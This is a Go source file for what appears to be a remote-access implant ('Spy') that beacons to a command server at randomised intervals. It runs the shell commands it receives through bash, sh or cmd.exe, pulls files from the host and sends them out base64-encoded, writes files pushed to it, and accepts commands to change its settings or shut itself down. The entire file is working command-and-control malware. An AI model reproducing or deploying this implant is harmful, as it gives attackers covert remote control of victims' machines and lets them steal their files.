package main

import (
	"bufio"
	"bytes"
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// CLient settings; derived from go build
var targ string
var secret string
var calls string
var ring string
var url string

// Define a global spy to allow runtime updates
var a Spy

// Spy settings struct
type Spy struct {
	Targ 		string 	`json:"targ"`
	Arch 		string 	`json:"arch"`
	Os 			string 	`json:"os"`
	Secret 		string 	`json:"secret"`
	Calls 		int 	`json:"calls"`
	Ring 		int 	`json:"ring"`
	Url 		string 	`json:"url"`
	Boot 		bool 	`json:"boot"`
	Kill 		bool 	`json:"kill"`
}

// Spy dial/tasking struct
type Dial struct {
	Targ 	string `json:"targ"`
	Secret 	string `json:"secret"`
	Job 	string `json:"job"`
	Results []Result
}

// Individual task
type Task struct {
	Id 		int 	`json:"id"`
	Command	string 	`json:"command"`
}

// Array of tasks
type TaskList struct {
	SpyTasking []Task
}

// Individual task result
type Result struct {
	Targ 	string 	`json:"targ"`
	JobId 	int 	`json:"jobId"`
	Output 	string 	`json:"output"`
}

// Run command
type RunCommand struct {
	Binary string
	Command string
	Shell bool
}

func main() {

	// Get spy configuration
	configSpy()

	// Start Polling
	startPolling()
}

func configSpy() {
	a.Targ = targ
	a.Secret = secret
	a.Arch = runtime.GOARCH
	a.Os = runtime.GOOS
	a.Ring,_ = strconv.Atoi(ring)
	a.Calls,_ = strconv.Atoi(calls)
	a.Url = url
	a.Boot = true
	a.Kill = false
}

func startPolling() {

	var wg sync.WaitGroup
	stop := make(chan bool)
	ticker := time.NewTicker(1 * time.Second)

	wg.Add(1)
	go func() {
		for {
			if a.Kill {
				wg.Done()
				stop <- true
				return
			}

			rand.Seed(time.Now().UnixNano())
			cf := rand.Intn(2)

			if cf == 1 {
				ticker = time.NewTicker(time.Duration(a.Calls + rand.Intn(a.Ring)) * time.Second)
			} else {
				ticker = time.NewTicker(time.Duration(a.Calls - rand.Intn(a.Ring)) * time.Second)
			}

			select {
			case <-ticker.C:
				getTasks()
			}
		}
	}()
	wg.Wait()
}

func b64Encode(s string) string {
	return b64.StdEncoding.EncodeToString([]byte(s))
}

func b64Decode(s string) []byte {
	x,_ :=b64.StdEncoding.DecodeString(s)
	return x
}

func makePostRequest(s string, r []Result, hb Dial) ([]byte, error) {

	var h Dial
	switch s {
	case "reboot":
		h = makeTask(a.Targ, a.Secret, s, r)
	case "post":
		h = hb
	case "dial":
		h = makeTask(a.Targ, a.Secret, s, r)
	case "update":
		h = hb
	}

	// Marshal dial
	m, err := json.Marshal(h)
	if err != nil {
		return nil, err
	}

	// Instantiate a http client
	timeout := 10 * time.Second
	spy := &http.Client{Transport: transport1(), Timeout: timeout}

	// Post dial
	resp, err := spy.Post(a.Url, "application/json", bytes.NewBuffer(m))
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return body, nil
}

func makeTask(n string, s string, j string, r []Result ) Dial {
	h := Dial{}
	h.Targ = n
	h.Secret = s
	h.Job = j
	h.Results = r
	return h
}

func addResult(o string, n string, i int) Result {
	t := Result{}
	t.Targ = n
	t.Output = o
	t.JobId = i
	return t
}

func updateSettings() bool {
	body, err := makePostRequest("reboot", nil, Dial{})

	if err != nil {
		return false
	}

	var t TaskList
	err = json.Unmarshal(body, &t)
	if err != nil {
		return false
	}

	if len(t.SpyTasking) > 0 {
		results := doTasks(t)
		if len(results.Results) > 0 {
			body,_ = makePostRequest("update", nil, results)
		}
	}
	return true
}

func doTasks(t TaskList) Dial {

	h := makeTask(a.Targ, a.Secret, "post", nil)

	for i := 0; i < len(t.SpyTasking); i++ {
		s := strings.TrimSpace(t.SpyTasking[i].Command)
		split := strings.Split(s, " ")

		out := b64Encode("Error running command(s)")

		switch strings.TrimSpace(split[0]) {
		case "/bin/bash":
			out = runTask(split, true)
		case "/bin/sh":
			out = runTask(split, true)
		case "cmd.exe":
			out = runTask(split, true)
		case "pull":
			out = readFile(split[1])
		case "push":
			err := writeFile(split[1], split[2])
			if !err {
				out = b64Encode("Successfully pushed file")
			}
		case "set":
			x, _ := strconv.Atoi(strings.TrimSpace(split[2]))
			if strings.TrimSpace(split[1]) == "calls" {
				a.Calls = x
				out = b64Encode("Calls updated")
			} else if strings.TrimSpace(split[1]) == "ring" {
				a.Ring = x
				out = b64Encode("Ring updated")
			}
		case "kill":
			a.Kill = true
			out = b64Encode("Spy successfully killed")
		case "update":
			h.Job = "update"
			token := strings.TrimSpace(split[1])
			out = fmt.Sprintf("%s,%s,%s,%s,%s,%d,%d", token, a.Targ, a.Secret, a.Arch, a.Os, a.Calls, a.Ring)
		}

		h.Results = append(h.Results, addResult(out, a.Targ, t.SpyTasking[i].Id))
	}

	return h
}

func writeFile(d string, fp string) bool {

	f, err := os.OpenFile(fp, os.O_CREATE|os.O_WRONLY,0755)
	if err !=nil {
		return true
	}
	defer f.Close()

	x := b64Decode(d)
	if _,err := f.Write(x); err != nil {
		return true
	}

	if err := f.Sync(); err != nil {
		return true
	}
	return false
}

func readFile(s string) string {
	if _, err := os.Stat(s); err == nil {
		f, err := os.Open(s)
		if err != nil {
			return b64Encode(err.Error())
		} else {
			reader := bufio.NewReader(f)
			content, _ := ioutil.ReadAll(reader)
			return b64.StdEncoding.EncodeToString(content)
		}
	} else {
		return b64Encode(err.Error())
	}
}

// Run task
func runTask(s []string, n bool) string {
	cmd := RunCommand {
		Binary: s[0],
		Command: strings.Join(s[1:], " "),
		Shell: n,
	}
	return b64Encode(execute(cmd))
}

// Get task from server
func getTasks() {

	if a.Boot {
		res := updateSettings()
		if res {
			a.Boot = false
		}
	}

	body, err := makePostRequest("dial", nil, Dial{})

	if err != nil {
		return
	}

	var t TaskList
	err2 := json.Unmarshal(body, &t)
	if err2 != nil {
		return
	}

	if len(t.SpyTasking) > 0 {
		results := doTasks(t)
		if len(results.Results) > 0 {
			body, _ = makePostRequest("post", nil, results)
		} else {
			return
		}
	}
}

// Execute shell commands
func execute(c RunCommand) string {

	if c.Shell {
		var out []byte
		var err error

		switch c.Binary {
		case "cmd.exe":
			out,err = exec.Command(c.Binary, "/c", c.Command).Output()
		default:
			out,err = exec.Command(c.Binary, "-c", c.Command).Output()
		}
		if err != nil {
			return err.Error()
		} else {
			return string(out[:])
		}
	} else {
		out, err := exec.Command(c.Binary, c.Command).Output()
		if err != nil {
			return err.Error()
		} else {
			return string(out[:])
		}
	}
}

func transport1() *http.Transport {
	return &http.Transport{
		DisableCompression:		false,
	}
}
